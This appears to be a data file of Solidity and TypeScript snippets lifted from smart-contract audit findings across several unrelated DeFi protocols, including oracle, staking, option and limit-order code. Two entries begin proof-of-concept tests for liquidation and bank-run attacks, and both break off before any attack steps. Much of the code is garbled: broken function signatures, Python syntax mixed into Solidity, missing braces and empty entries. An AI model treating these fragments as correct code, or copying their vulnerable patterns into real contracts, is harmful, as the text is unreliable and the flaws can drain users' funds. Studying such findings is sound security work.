"```\nfunction fund(IMarket market) external {\n    if (!instances(IInstance(address(market)))) {\n        revert FactoryNotInstanceError();\n    }\n    market.claimFee();\n}\n```\nfunction claimFee() external {\n    Global memory newGlobal = _global.read();\n\n    if (_claimFee(address(factory()), newGlobal.protocolFee)) {\n        newGlobal.protocolFee = UFixed6Lib.ZERO;\n    }\n}\n```\n```\nfunction _claimFee(address receiver, UFixed6 fee) private returns (bool) {\n    if (msg.sender!= receiver) {\n        return false;\n    }\n\n    token.push(receiver, UFixed18Lib.from(fee));\n    emit FeeClaimed(receiver, fee);\n    return true;\n}\n```"
"```\nfunction _recordPrice(uint256 oracleVersion, PythStructs.Price memory price) private {\n    _prices[oracleVersion] = Fixed6Lib.from(price.price).mul(\n        Fixed6Lib.from(SafeCast.toInt256(10 ** SafeCast.toUint256(price.expo > 0? price.expo : -price.expo))\n    );\n    _publishTimes[oracleVersion] = price.publishTime;\n}\n```"
"```\nfunction _loadContext(address account) private view returns (Context memory context) {\n    context.global = _accounts[address(0)].read();\n    context.local = _accounts[account].read();\n    context.latestCheckpoint = _checkpoints[context.global.latest].read();\n}\n```\n```\nfunction _settle(Context memory context) private {\n    // settle global positions\n    while (\n        context.global.current > context.global.latest &&\n        _mappings[context.global.latest + 1].read().ready(context.latestIds)\n    ) {\n        uint256 newLatestId = context.global.latest + 1;\n        context.latestCheckpoint = _checkpoints[newLatestId].read();\n        (\n            Fixed6 collateralAtId,\n            UFixed6 feeAtId,\n            UFixed6 keeperAtId\n        ) = _collateralAtId(context, newLatestId);\n        context.latestCheckpoint.complete(\n            collateralAtId,\n            feeAtId,\n            keeperAtId\n        );\n        context.global.processGlobal(\n            newLatestId,\n            context.latestCheckpoint,\n            context.latestCheckpoint.deposit,\n            context.latestCheckpoint.redemption\n        );\n        _checkpoints[newLatestId].store(context.latestCheckpoint);\n    }\n\n    // settle local position\n    if (\n        context.local.current > context.local.latest &&\n        _mappings[context.local.current].read().ready(context.latestIds)\n    ) {\n        uint256 newLatestId = context.local.current;\n        Checkpoint memory checkpoint = _checkpoints[newLatestId].read();\n        context.local.processLocal(\n            newLatestId,\n            checkpoint,\n            context.local.deposit,\n            context.local.redemption\n        );\n    }\n}\n```"
"```\nuint256 latestTimestamp = global.latest == 0? 0 : oracles[global.latest].provider.latest().timestamp;\nif (uint256(oracles[global.latest].timestamp) > latestTimestamp) {\n    return false;\n}\n```\n```\nuint256 versionToCommit = versionList[versionIndex];\nPythStructs.Price memory pythPrice = _validateAndGetPrice(versionToCommit, updateData);\n```\n```\nreturn pyth.parsePriceFeedUpdates({\n    value: pyth.getUpdateFee(updateDataList)\n})(\n    updateDataList,\n    idList,\n    SafeCast.toUint64(oracleVersion + MIN_VALID_TIME_AFTER_VERSION),\n    SafeCast.toUint64(oracleVersion + MAX_VALID_TIME_AFTER_VERSION)\n)[0].price;\n```\n```\nif (versionList.length > nextVersionIndexToCommit \n    && oracleVersion >= versionList[nextVersionIndexToCommit]) {\n    commitRequested(nextVersionIndexToCommit, updateData);\n    return;\n}\n```\n```\nfunction request(address account) external onlyAuthorized {\n    (OracleVersion memory latestVersion, uint256 currentTimestamp) = oracles[global.current].provider.status();\n\n    oracles[global.current].provider.request(account);\n    oracles[global.current].timestamp = uint256(currentTimestamp);\n    _updateLatest(latestVersion);\n}\n```"
"```\nit('panprog bad debt liquidation bankrun', async () => {\n  function setupOracle(price: string, timestamp: number, nextTimestamp: number) {\n    const oracleVersion = {\n      price: parse6decimal(price),\n      timestamp,\n      valid: true,\n    };\n    oracle.at.whenCalledWith(oracleVersion.timestamp).returns(oracleVersion);\n    oracle.status.returns([oracleVersion, nextTimestamp]);\n    oracle.request.returns();\n  }\n\n  const riskParameter = {\n    maintenance: parse6decimal('0.01'),\n    takerFee: parse6decimal('0.00'),\n    takerSkewFee: 0,\n    takerImpactFee: 0,\n    makerFee: parse6decimal('0.00'),\n    makerImpactFee: 0,\n    makerLimit: parse6decimal('1000'),\n    efficiencyLimit: parse6decimal('0.2'),\n    liquidationFee: parse6decimal('0.50'),\n    minLiquidationFee: parse6decimal('10'),\n    maxLiquidationFee: parse6decimal('1000'),\n    utilizationCurve: {\n      minRate: parse6decimal('0.0'),\n      maxRate: parse6decimal('1.00'),\n      targetRate: parse6decimal('0.10'),\n      targetUtilization: parse6decimal('0.50'),\n    },\n    pController: {\n      k: parse6decimal('40000'),\n      max: parse6decimal('1.20'),\n    },\n    minMaintenance: parse6decimal('10'),\n    virtualTaker: parse6decimal('0'),\n    staleAfter: 14400,\n    makerReceiveOnly: false,\n  };\n\n  const marketParameter = {\n    fundingFee: parse6decimal('0.0'),\n    interestFee: parse6decimal('0.0'),\n    oracleFee: parse6decimal('0.0'),\n    riskFee: parse6decimal('0.0'),\n    positionFee: parse6decimal('0.0'),\n    maxPendingGlobal: 5,\n    maxPendingLocal: 3,\n    settlementFee: parse6decimal('0'),\n    makerRewardRate: parse6decimal('0'),\n    longRewardRate: parse6decimal('0'),\n    shortRewardRate: parse6decimal('0'),\n    makerCloseAlways: false,\n    takerCloseAlways: false,\n    closed: false,\n  };\n\n  await market.connect(owner).updateRiskParameter(riskParameter);\n  await market.connect(owner).update\n```\ncollateral before liquidation: 10000000 + 500000000 + 500000000 = 1010000000\ncollateral after liquidation: -100000080 + 550000000 + 550000000 = 999999920\n```"
"```\nfunction _invariant(\n    Context memory context,\n    address account,\n    Order memory newOrder,\n    Fixed6 collateral,\n    bool protected\n) private view {\n    if (protected) return; // The following invariants do not apply to protected position updates (liquidations)\n\n    if (\n        context.global.currentId > context.global.latestId + context.marketParameter.maxPendingGlobal ||\n        context.local.currentId > context.local.latestId + context.marketParameter.maxPendingLocal\n    ) {\n        revert MarketExceedsPendingIdLimitError();\n    }\n}\n```\n```\n_invariant(context, account, newOrder, collateral, protected);\n\n_pendingPosition[context.global.currentId].store(context.currentPosition.global);\n_pendingPositions[account][context.local.currentId].store(context.currentPosition.local);\n```\n```\nfunction _settle(Context memory context, address account) private {\n    while (\n        context.global.currentId!= context.global.latestId &&\n        (nextPosition = _pendingPosition[context.global.latestId + 1].read()).ready(context.latestVersion)\n    ) {\n        _processPositionGlobal(context, context.global.latestId + 1, nextPosition);\n    }\n```\n```\nfunction update(\n    address account,\n    UFixed6 newMaker,\n    UFixed6 newLong,\n    UFixed6 newShort,\n    Fixed6 collateral,\n    bool protect\n) external nonReentrant whenNotPaused {\n    Context memory context = _loadContext(account);\n    _settle(context, account);\n    _update(context, account, newMaker, newLong, newShort, collateral, protect);\n    _saveContext(context, account);\n}\n```"
"```\nit('panprog liquidate unsuspecting user / self in 1 transaction', async () => {\n  function setupOracle(price: string, timestamp: number, nextTimestamp: number) {\n    const oracleVersion = {\n      price: parse6decimal(price),\n      timestamp,\n      valid: true,\n    };\n    oracle.at.whenCalledWith(oracleVersion.timestamp).returns(oracleVersion);\n    oracle.status.returns([oracleVersion, nextTimestamp]);\n    oracle.request.returns();\n  }\n\n  const riskParameter = {\n    maintenance: parse6decimal('0.2'),\n    takerFee: parse6decimal('0.00'),\n    takerSkewFee: 0,\n    takerImpactFee: 0,\n    makerFee: parse6decimal('0.00'),\n    makerImpactFee: 0,\n    makerLimit: parse6decimal('1000'),\n    efficiencyLimit: parse6decimal('0.2'),\n    liquidationFee: parse6decimal('0.50'),\n    minLiquidationFee: parse6decimal('10'),\n    maxLiquidationFee: parse6decimal('1000'),\n    utilizationCurve: {\n      minRate: parse6decimal('0.0'),\n      maxRate: parse6decimal('1.00'),\n      targetRate: parse6decimal('0.10'),\n      targetUtilization: parse6decimal('0.50'),\n    },\n    pController: {\n      k: parse6decimal('40000'),\n      max: parse6decimal('1.20'),\n    },\n    minMaintenance: parse6decimal('10'),\n    virtualTaker: parse6decimal('0'),\n    staleAfter: 14400,\n    makerReceiveOnly: false,\n  };\n\n  const marketParameter = {\n    fundingFee: parse6decimal('0.0'),\n    interestFee: parse6decimal('0.0'),\n    oracleFee: parse6decimal('0.0'),\n    riskFee: parse6decimal('0.0'),\n    positionFee: parse6decimal('0.0'),\n    maxPendingGlobal: 5,\n    maxPendingLocal: 3,\n    settlementFee: parse6decimal('0'),\n    makerRewardRate: parse6decimal('0'),\n    longRewardRate: parse6decimal('0'),\n    shortRewardRate: parse6decimal('0'),\n    makerCloseAlways: false,\n    takerCloseAlways: false,\n    closed: false,\n  };\n\n  await market.connect(owner).updateRiskParameter(riskParameter);\n  await\n```\nliquidated_maker: collateral = 99980000\nmaker = 0\n```"
"```\ncontract OracleFactory is IOracleFactory, Factory {\n    function update(bytes32 id, IOracleProviderFactory factory) external onlyOwner {\n        if (!factories[factory]) {\n            revert OracleFactoryNotRegisteredError();\n        }\n        if (oracles[id] == IOracleProvider(address(0))) {\n            revert OracleFactoryNotCreatedError();\n        }\n\n        IOracleProvider oracleProvider = factory.oracles(id);\n        if (oracleProvider == IOracleProvider(address(0))) {\n            revert OracleFactoryInvalidIdError();\n        }\n\n        IOracle oracle = IOracle(address(oracles[id]));\n        oracle.update(oracleProvider);\n    }\n```\n```\nfunction update(IOracleProvider newProvider) external onlyOwner {\n    _updateCurrent(newProvider);\n    _updateLatest(newProvider.latest());\n}\n\nmodifier onlyOwner {\n    if (msg.sender!= factory().owner()) revert InstanceNotOwnerError(msg.sender);\n    _;\n}\n```"
```\nif (fromPosition.long.gt(fromPosition.short)):\n    fundingValues.fundingMaker = fundingValues.fundingShort.mul(Fixed6Lib.from(fromPosition.skew().abs()))\n    fundingValues.fundingShort = fundingValues.fundingShort.sub(fundingValues.fundingMaker)\n\nif (fromPosition.short.gt(fromPosition.long)):\n    fundingValues.fundingMaker = fundingValues.fundingLong.mul(Fixed6Lib.from(fromPosition.skew().abs()))\n    fundingValues.fundingLong = fundingValues.fundingLong.sub(fundingValues.fundingMaker)\n```
"```\nif (tokens.length == 3) {\n    uint256 ethPrice = base.getPrice(tokens[2]);\n    return (lpPrice(\n        virtualPrice,\n        base.getPrice(tokens[1]),\n        ethPrice,\n        base.getPrice(tokens[0])\n    ) * 1e18) / ethPrice;\n}\n```\n0x4ebdf703948ddcea3b11f675b4d1fba9d2414a14 - CRV\n0x5426178799ee0a0181a89b4f57efddfab49941ec - INV\n0x2889302a794da87fbf1d6db415c1492194663d13 - wstETH\n```"
"```\nFile: blueberry-core/contracts/spell/CurveSpell.sol\n\nfunction _doBorrow(\n    address param.borrowToken,\n    uint256 param.borrowAmount\n) internal returns (uint256 borrowBalance) {\n    // 2. Borrow specific amounts\n    borrowBalance = _doBorrow(\n        param.borrowToken,\n        param.borrowAmount\n    );\n\n    // 3. Add liquidity on curve\n    address borrowToken = param.borrowToken;\n    _ensureApprove(param.borrowToken, pool, borrowBalance);\n\n    if (tokens.length == 2) {\n        uint256[2] memory suppliedAmts;\n        for (uint256 i = 0; i < 2; i++) {\n            if (tokens[i] == borrowToken) {\n                suppliedAmts[i] = IERC20Upgradeable(tokens[i]).balanceOf(\n                    address(this)\n                );\n                break;\n            }\n        }\n        ICurvePool(pool).add_liquidity(suppliedAmts, minLPMint);\n    } else if (tokens.length == 3) {\n```"
"```\nuint256 decimals = registry.decimals(token, USD);\n\n(\n    uint80 roundID,\n    int256 answer,\n   ,\n    uint256 updatedAt,\n    uint80 answeredInRound\n) = registry.latestRoundData(token, USD);\n\nif (updatedAt < block.timestamp - maxDelayTime) {\n    revert Errors.PRICE_OUTDATED(token_);\n}\n\nif (answer <= 0) {\n    revert Errors.PRICE_NEGATIVE(token_);\n}\n\nif (answeredInRound < roundID) {\n    revert Errors.PRICE_OUTDATED(token_);\n}\n\nreturn (answer.toUint256() * Constants.PRICE_PRECISION) / (10 ** decimals);\n```"
"```\n(\n    uint256[] memory minAmountsOut,\n    address[] memory tokens,\n    uint256 borrowTokenIndex\n) = _getExitPoolParams(param.borrowToken, lpToken);\n\nwAuraPools.getVault(lpToken).exitPool(\n    IBalancerPool(lpToken).getPoolId(),\n    address(this),\n    address(this),\n    IBalancerVault.ExitPoolRequest(\n        tokens,\n        minAmountsOut,\n        abi.encode(0, amountPosRemove, borrowTokenIndex),\n        false\n    )\n)\n```\n(address[] memory tokens,, ) = wAuraPools.getPoolTokens(lpToken);\n\nuint256 length = tokens.length;\nuint256[] memory minAmountsOut = new uint256[](length);\n```"
"```\nfunction _exitPool() public {\n    wAuraPools.getVault(lpToken).exitPool(\n        IBalancerPool(lpToken).getPoolId(),\n        address(this),\n        address(this),\n        IBalancerVault.ExitPoolRequest(\n            tokens,\n            minAmountsOut,\n            abi.encode(0, amountPosRemove, borrowTokenIndex),\n            false\n        )\n    );\n}\n\nuint256 rewardTokensLength = rewardTokens.length;\nfor (uint256 i = 0; i < rewardTokensLength; i++) {\n    address sellToken = rewardTokens[i];\n    if (sellToken == STASH_AURA) sellToken = AURA;\n    _doCutRewardsFee(sellToken);\n}\n```"
"```\n_doCutRewardsFee(sellToken);\n\nif (\n    expectedRewards[i]!= 0 &&\n   !PSwapLib.swap(\n        augustusSwapper,\n        tokenTransferProxy,\n        sellToken,\n        expectedRewards[i],\n        swapDatas[i]\n    )\n) {\n    revert Errors.SWAP_FAILED(sellToken);\n}\n```"
"```\nif (tokens.length == 2) {\n    uint256[2] memory suppliedAmts;\n    for (uint256 i = 0; i < 2; ++i) {\n        suppliedAmts[i] = IERC20Upgradeable(tokens[i]).balanceOf(address(this));\n    }\n    ICurvePool(pool).add_liquidity(suppliedAmts, minLPMint);\n}"
"```\nuint256 rewardTokensLength = rewardTokens.length;\nfor (uint256 i = 0; i < rewardTokensLength; i++) {\n    IERC20Upgradeable(rewardTokens[i]).safeTransfer(\n        msg.sender,\n        rewards[i]\n    );\n}"
"```\npragma solidity ^0.8.0;\n\ncontract AuraSpell {\n    function openPositionFarm(\n        OpenPosParam calldata param,\n        uint256 minimumBPT\n    ) {\n        // 3. Add liquidity to the Balancer pool and receive BPT in return.\n        {\n            if (poolAmountOut!= 0) {\n                vault.joinPool(\n                    wAuraPools.getBPTPoolId(lpToken),\n                    address(this),\n                    address(this),\n                    IBalancerVault.JoinPoolRequest({\n                        assets: tokens,\n                        maxAmountsIn: maxAmountsIn,\n                        userData: abi.encode(1, amountsIn, _minimumBPT),\n                        fromInternalBalance: false\n                    })\n                );\n            }\n        }\n    }\n\n    function _getJoinPoolParamsAndApprove(\n        address vault,\n        address[] memory tokens,\n        uint256[] memory balances,\n        address lpToken\n    ) internal returns (uint256[] memory, uint256[] memory, uint256) {\n        uint256 length = tokens.length;\n        uint256[] memory maxAmountsIn = new uint256[](length);\n        uint256[] memory amountsIn = new uint256[](length);\n        bool isLPIncluded;\n        for (uint256 i = 0; i < length; i++) {\n            if (tokens[i]!= lpToken) {\n                amountsIn[i] = IERC20(tokens[i]).balanceOf(address(this));\n                if (amountsIn[i] > 0) {\n                    _ensureApprove(tokens[i], vault, amountsIn[i]);\n                }\n                maxAmountsIn[i] = IERC20(tokens[i]).balanceOf(address(this));\n            } else {\n                isLPIncluded = true;\n            }\n        }\n        if (isLPIncluded) {\n            assembly {\n                mstore(amountsIn, sub(mload(amountsIn), 1))\n            }\n        }\n        return (maxAmountsIn, amountsIn, poolAmountOut);\n    }\n}\n```\n```\nif (isLPIncluded) {\n    assembly {\n        mstore(amountsIn, sub(mload(amountsIn), 1))\n    }\n}\n```\nIBalancerVault.JoinPoolRequest({\n    assets: tokens,\n    maxAmountsIn: maxAmountsIn,\n    userData: abi.encode(1, amountsIn, _minimumBPT),\n    fromInternalBalance: false\n})"
"```\nfunction initializeDistributionRecord(\n    uint32 _domain, // the domain of the beneficiary\n    address _beneficiary, // the address that will receive tokens\n    uint256 _amount, // the total claimable by this beneficiary\n    bytes32[] calldata merkleProof\n) external validMerkleProof(_getLeaf(_beneficiary, _amount, _domain), merkleProof) {\n    _initializeDistributionRecord(_beneficiary, _amount);\n}\n```\n```\nfunction _initializeDistributionRecord(\n    address beneficiary,\n    uint256 totalAmount\n) internal virtual override {\n    super._initializeDistributionRecord(beneficiary, totalAmount);\n\n    mint(beneficiary, tokensToVotes(totalAmount));\n}\n```"
"```\n        // safeApprove should only be called when setting an initial allowance, or when resetting it to zero.\n        // To increase and decrease it, use'safeIncreaseAllowance' and'safeDecreaseAllowance'\n```\n```\nfunction _allowConnext(uint256 amount) internal {\n    token.safeApprove(address(connext), amount);\n}\n\nfunction _setTotal(uint256 _total) internal virtual override onlyOwner {\n    super._setTotal(_total);\n    _allowConnext(_total - claimed);\n}\n```"
"```\nid = connext.xcall(\n    _recipientDomain,  # destination domain\n    _recipient,  # to\n    address(token),  # asset\n    _recipient,  # delegate, only required for self-execution + slippage\n    _amount,  # amount\n    0,  # slippage -- assumes no pools on connext\n    bytes('')\n)"
"```\nfunction claim(\n    address beneficiary\n) external validSaleParticipant(beneficiary) nonReentrant {\n    uint256 claimableAmount = getClaimableAmount(beneficiary);\n    uint256 purchasedAmount = getPurchasedAmount(beneficiary);\n\n    uint256 claimedAmount = super._executeClaim(beneficiary, purchasedAmount);\n\n    super._settleClaim(beneficiary, claimedAmount);\n}\n```\n```\nfunction _executeClaim(\n    address beneficiary,\n    uint256 _totalAmount\n) internal virtual returns (uint256) {\n    uint120 totalAmount = uint120(_totalAmount);\n\n    if (records[beneficiary].total!= totalAmount) {\n        // re-initialize if the total has been updated\n        _initializeDistributionRecord(beneficiary, totalAmount);\n    }\n\n    uint120 claimableAmount = uint120(getClaimableAmount(beneficiary));\n    require(claimableAmount > 0, 'Distributor: no more tokens claimable right now');\n\n    records[beneficiary].claimed += claimableAmount;\n    claimed += claimableAmount;\n\n    return claimableAmount;\n}\n```\n```\nif (records[beneficiary].total!= totalAmount):\n    # re-initialize if the total has been updated\n    _initializeDistributionRecord(beneficiary, totalAmount)\n```"
"```\nfunction _calculateQuoteAssetQuantity(\n    bool isSellAuction,\n    uint256 _componentQuantity,\n    uint256 _componentPrice\n) private pure returns (uint256) {\n    return isSellAuction\n       ? _componentQuantity.preciseMulCeil(_componentPrice)\n        : _componentQuantity.preciseMul(_componentPrice);\n}\n```\n```\n1e18 * price / 1e18 = 2000e6\n```\n```\nprice = 2000e6\n```\n```\nprice = 18 - component_dp + quote_dp\n```\n```\nuint256 expExpression = uint256(FixedPointMathLib.expWad(expArgument));\n\nif (scalingFactor > type(uint256).max / expExpression) {\n    return _getBoundaryPrice(isDecreasing, maxPrice, minPrice);\n}\n\nuint256 priceChange = scalingFactor * expExpression - WAD;\n\nif (isDecreasing) {\n    if (priceChange > initialPrice) {\n        return minPrice;\n    }\n    return FixedPointMathLib.max(initialPrice - priceChange, minPrice);\n}\n```\nexpWad(1e6) - WAD = 1e6\nexpWad(5e6) - WAD = 5e6\nexpWad(10e6) - WAD = 10e6\nexpWad(1000e6) - WAD = 1000e6\n```"
"```\nfunction unlock(ISetToken _setToken) external {\n    bool isRebalanceDurationElapsed = _isRebalanceDurationElapsed(_setToken);\n    bool canUnlockEarly = _canUnlockEarly(_setToken);\n\n    require(isRebalanceDurationElapsed || canUnlockEarly, ""Cannot unlock early unless all targets are met and raiseTargetPercentage is zero"");\n\n    if (canUnlockEarly) {\n        delete rebalanceInfo[_setToken].rebalanceDuration;\n        emit LockedRebalanceEndedEarly(_setToken);\n    }\n\n    _setToken.unlock();\n}\n```\n```\nfunction _canUnlockEarly(ISetToken _setToken) internal view returns (bool) {\n    RebalanceInfo storage rebalance = rebalanceInfo[_setToken];\n    return \n        _allTargetsMet(_setToken) \n        && _isQuoteAssetExcessOrAtTarget(_setToken) \n        && rebalance.raiseTargetPercentage == 0;\n}\n```\n```\nfunction setRaiseTargetPercentage(\n    ISetToken _setToken,\n    uint256 _raiseTargetPercentage\n)\n    external\n    onlyManagerAndValidSet(_setToken)\n{\n    require(_raiseTargetPercentage > 0, ""Target percentage must be greater than 0"");\n\n    rebalanceInfo[_setToken].raiseTargetPercentage = _raiseTargetPercentage;\n\n    emit RaiseTargetPercentageUpdated(_setToken, _raiseTargetPercentage);\n}\n```"
"```\n(\n    uint256 initialPrice,\n    uint256 scalingFactor,\n    uint256 timeCoefficient,\n    uint256 bucketSize,\n    bool isDecreasing,\n    uint256 maxPrice,\n    uint256 minPrice\n) = getDecodedData(_priceAdapterConfigData);\n\nuint256 timeBucket = _timeElapsed / bucketSize;\n\nint256 expArgument = int256(timeCoefficient * timeBucket);\n\nuint256 expExpression = uint256(FixedPointMathLib.expWad(expArgument));\n\nuint256 priceChange = scalingFactor * expExpression - WAD;\n```"
"```\nrequire(_componentQuantity <= bidInfo.auctionQuantity, ""Bid size exceeds auction quantity"")\n```"
"```\nif (msg.sender!= receiver) {\n    revert Teller_NotAuthorized();\n}\n\nuint256 amount = optionToken.totalSupply();\n\nif (call) {\n    payoutToken.safeTransfer(receiver, amount);\n} else {\n    // Calculate amount of quote tokens equivalent to amount at strike price\n    uint256 quoteAmount = amount.mulDiv(strikePrice, 10 ** payoutToken.decimals());\n    quoteToken.safeTransfer(receiver, quoteAmount);\n}\n```"
"```\nfunction create(\n    FixedStrikeOptionToken optionToken_,\n    uint256 amount_\n) external override nonReentrant {\n    if (call) {\n        // rest of code\n    } else {\n        uint256 quoteAmount = amount_.mulDiv(strikePrice, 10 ** payoutToken.decimals());\n        quoteToken.safeTransferFrom(msg.sender, address(this), quoteAmount);\n        // rest of code\n    }\n    optionToken.mint(msg.sender, amount_);\n}\n```\n```\nfunction exercise(\n    FixedStrikeOptionToken optionToken_,\n    uint256 amount_\n) external override nonReentrant {\n    uint256 quoteAmount = amount_.mulDiv(strikePrice, 10 ** payoutToken.decimals());\n\n    if (msg.sender!= receiver) {\n        // rest of code\n    }\n\n    optionToken.burn(msg.sender, amount_);\n\n    if (call) {\n        // rest of code\n    } else {\n        quoteToken.safeTransfer(msg.sender, quoteAmount);\n    }\n}\n```\n```\nuint256 quoteAmount = amount_.mulDiv(strikePrice, 10 ** payoutToken.decimals());\n\nuint256 startBalance = quoteToken.balanceOf(address(this));\nquoteToken.safeTransferFrom(msg.sender, address(this), quoteAmount);\n```\n```\nuint256 amount = optionToken.totalSupply();\n\nif (call) {\n    payoutToken.safeTransfer(receiver, amount);\n} else {\n    uint256 quoteAmount = amount.mulDiv(strikePrice, 10 ** payoutToken.decimals());\n    quoteToken.safeTransfer(receiver, quoteAmount);\n}\n```"
```\n```\n```
"```\nif (uint48(block.timestamp) >= expiry) {\n    revert Teller_OptionExpired(expiry);\n}\n```\n```\nfunction _claimRewards() internal returns (uint256) {\n    // Claims all outstanding rewards for the user across epochs\n    // If there are unclaimed rewards from epochs where the option token has expired, the rewards are lost\n\n    uint48 userLastEpoch = lastEpochClaimed[msg.sender];\n```\n```\nif (uint256(optionToken.expiry()) < block.timestamp) {\n    return 0;\n}\n```\n```\nQ: On what chains are the smart contracts going to be deployed?\n    Mainnet, Arbitrum, Optimism\n```"
"```\nstakeBalance[msg.sender] = userBalance + amount_;\ntotalBalance += amount_;\n\nstakedToken.safeTransferFrom(msg.sender, address(this), amount_);\n```\n```\npayoutToken.approve(address(optionTeller), rewards)\noptionTeller.create(optionToken, rewards)\n\nERC20(address(optionToken)).safeTransfer(msg.sender, rewards)\n```"
"```\nfunction approve(address spender, uint256 amount) public virtual returns (bool) {\n    allowance[msg.sender][spender] = amount;\n\n    emit Approval(msg.sender, spender, amount);\n\n    return true;\n}\n```"
```\nfunction currentRewardsPerToken() public view returns (uint256) {\n    if (totalBalance == 0) return rewardsPerTokenStored;\n\n    uint256 rewardsToApply = ((block.timestamp - lastRewardUpdate) * rewardRate) / REWARD_PERIOD;\n\n    return rewardsPerTokenStored + (rewardsToApply * 10 ** stakedTokenDecimals) / totalBalance;\n}\n```\n```\n/// @notice Amount of time (in seconds) that the reward rate is distributed over\nuint48 public constant REWARD_PERIOD = uint48(1 days);\n```
```\nif (uint256(expiry) < block.timestamp) {\n    revert Teller_OptionExpired(expiry);\n}\n```\n```\nif (uint48(block.timestamp) >= expiry) {\n    revert Teller_OptionExpired(expiry);\n}\n```
"```\nfunction stake(\n    uint256 amount_,\n    bytes calldata proof_\n) external nonReentrant requireInitialized updateRewards tryNewEpoch {\n    uint256 userBalance = stakeBalance[msg.sender];\n    if (userBalance > 0) {\n        _claimRewards();\n    } else {\n        rewardsPerTokenClaimed[msg.sender] = rewardsPerTokenStored;\n    }\n\n    stakeBalance[msg.sender] = userBalance + amount_;\n    totalBalance += amount_;\n\n    stakedToken.safeTransferFrom(msg.sender, address(this), amount_);\n}\n```\nfunction _claimRewards() internal returns (uint256) {\n    // Claims all outstanding rewards for the user across epochs\n    // If there are unclaimed rewards from epochs where the option token has expired, the rewards are lost\n\n    uint48 userLastEpoch = lastEpochClaimed[msg.sender];\n\n    if (userLastEpoch == epoch) {\n        return _claimEpochRewards(epoch);\n    }\n\n    uint256 totalRewardsClaimed;\n\n    for (uint48 i = userLastEpoch; i <= epoch; i++) {\n        totalRewardsClaimed += _claimEpochRewards(i);\n    }\n\n    return totalRewardsClaimed;\n}"
"```\nfunction _claimEpochRewards(uint48 epoch_) internal returns (uint256) {\n    uint256 rewards = ((rewardsPerTokenEnd - userRewardsClaimed) * stakeBalance[msg.sender]) / 10 ** stakedTokenDecimals;\n    // Mint the option token on the teller\n    // This transfers the reward amount of payout tokens to the option teller in exchange for the amount of option tokens\n    payoutToken.approve(address(optionTeller), rewards);\n    optionTeller.create(optionToken, rewards);\n}\n```"
"```\nfunction claimOrder(uint128 batchId, address user) external payable returns (ERC20, uint256) {\n    // Transfer tokens owed to user.\n    tokenOut.safeTransfer(user, owed);\n\n    address sender = _msgSender();\n    if (msg.value >= userClaim.feePerUser) {\n        // refund if necessary.\n        uint256 refund = msg.value - userClaim.feePerUser;\n        if (refund > 0) {\n            sender.safeTransferETH(refund);\n        }\n    } else {\n        WRAPPED_NATIVE.safeTransferFrom(sender, address(this), userClaim.feePerUser);\n        // If value is non zero send it back to caller.\n        if (msg.value > 0) {\n            sender.safeTransferETH(msg.value);\n        }\n    }\n}\n```\n```\nfunction withdrawNative() external onlyOwner {\n    uint256 wrappedNativeBalance = WRAPPED_NATIVE.balanceOf(address(this));\n    uint256 nativeBalance = address(this).balance;\n\n    if (wrappedNativeBalance == 0 && nativeBalance == 0) {\n        revert LimitOrderRegistry__ZeroNativeBalance();\n    }\n\n    if (wrappedNativeBalance > 0) {\n        WRAPPED_NATIVE.safeTransfer(owner, wrappedNativeBalance);\n    }\n\n    if (nativeBalance > 0) {\n        owner.safeTransferETH(nativeBalance);\n    }\n}\n```"
"```\nfunction setFastGasFeed(address feed) external onlyOwner {\n    fastGasFeed = feed;\n}\n```\n```\nfunction performUpkeep(bytes calldata performData) external {\n    (UniswapV3Pool pool, bool walkDirection, uint256 deadline) = abi.decode(\n        performData,\n        (UniswapV3Pool, bool, uint256)\n    );\n\n    if (address(poolToData[pool].token0) == address(0)) {\n        revert LimitOrderRegistry__PoolNotSetup(address(pool));\n    }\n\n    PoolData storage data = poolToData[pool];\n\n    uint256 estimatedFee = uint256(upkeepGasLimit * getGasPrice());\n```"
"```\nfunction claimOrder(uint128 batchId, address user) external payable returns (ERC20, uint256) {\n    // Transfer fee in.\n    address sender = _msgSender();\n    if (msg.value >= userClaim.feePerUser) {\n        uint256 refund = msg.value - userClaim.feePerUser;\n        if (refund > 0) {\n            sender.safeTransferETH(refund);\n        }\n    } else {\n        WRAPPED_NATIVE.safeTransferFrom(sender, address(this), userClaim.feePerUser);\n        if (msg.value > 0) {\n            sender.safeTransferETH(msg.value);\n        }\n    }\n}\n```"
"```\nfunction claimOrder(uint128 batchId, address user) external payable returns (ERC20, uint256) {\n    Claim storage userClaim = claim[batchId];\n    if (!userClaim.isReadyForClaim) {\n        revert LimitOrderRegistry__OrderNotReadyToClaim(batchId);\n    }\n    uint256 depositAmount = batchIdToUserDepositAmount[batchId][user];\n    if (depositAmount == 0) {\n        revert LimitOrderRegistry__UserNotFound(user, batchId);\n\n    // Zero out user balance.\n    delete batchIdToUserDepositAmount[batchId][user];\n\n    // Calculate owed amount.\n    uint256 totalTokenDeposited;\n    uint256 totalTokenOut;\n    ERC20 tokenOut;\n\n    // again, remembering that direction == true means that the input token is token0.\n    if (userClaim.direction) {\n        totalTokenDeposited = userClaim.token0Amount;\n        totalTokenOut = userClaim.token1Amount;\n        tokenOut = poolToData[userClaim.pool].token1;\n    } else {\n        totalTokenDeposited = userClaim.token1Amount;\n        totalTokenOut = userClaim.token0Amount;\n        tokenOut = poolToData[userClaim.pool].token0;\n    }\n\n    uint256 owed = (totalTokenOut * depositAmount) / totalTokenDeposited;\n\n    // Transfer tokens owed to user.\n    tokenOut.safeTransfer(user, owed);\n}\n```\n```\nowed = (totalTokenOut * depositAmount) / totalTokenDeposited\nowed = (9 * 10**6 * 10 * 10**18) / (100000000 * 10**18)\nowed = (9 * 10**6 * 10) / (100000000)\nowed = 90000000 / 100000000\nowed = 0.9\n```\n```\ntokenOut.safeTransfer(user, owed)"
"```\nfunction _beforeTokenTransfer(address from, address to, uint256) internal virtual override {\n    // Restrictions ignored for minting and burning\n    // If transferRestrictor is not set, no restrictions are applied\n\n    if (from == address(0) || to == address(0) || address(transferRestrictor) == address(0)) {\n        return;\n    }\n\n    // Check transfer restrictions\n    transferRestrictor.requireNotRestricted(from, to);\n}\n```\n```\nfunction requireNotRestricted(address from, address to) external view virtual {\n    if (blacklist[from] || blacklist[to]) {\n        revert AccountRestricted();\n    }\n}\n```"
